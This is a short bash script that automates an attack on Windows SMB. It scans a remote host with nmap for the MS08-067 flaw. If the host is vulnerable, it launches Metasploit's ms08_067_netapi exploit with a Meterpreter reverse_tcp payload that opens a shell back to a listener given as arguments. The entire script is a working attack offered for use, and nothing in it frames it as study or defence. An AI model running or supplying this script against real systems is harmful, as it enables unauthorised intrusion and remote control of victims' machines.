#! /bin/bash

if [ ! $1 ]; then echo "Usage: #./script <RHOST> <LHOST> <LPORT>"; exit; fi

rhost=$1
lhost=$2
lport=$3

nmap --script smb-vuln-ms08-067.nse -p 445 $rhost --script-args=unsafe=1 -oN tmp_output.txt
if grep -q VULNERABLE: tmp_output.txt; 
      then echo "$rhost appears to be vulnerable, exploiting with Metasploit...";
       msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST $rhost; set PAYLOAD windows/meterpreter/reverse_tcp;  set LHOST $lhost; set LPORT $lport; run"
fi
rm tmp_output.txt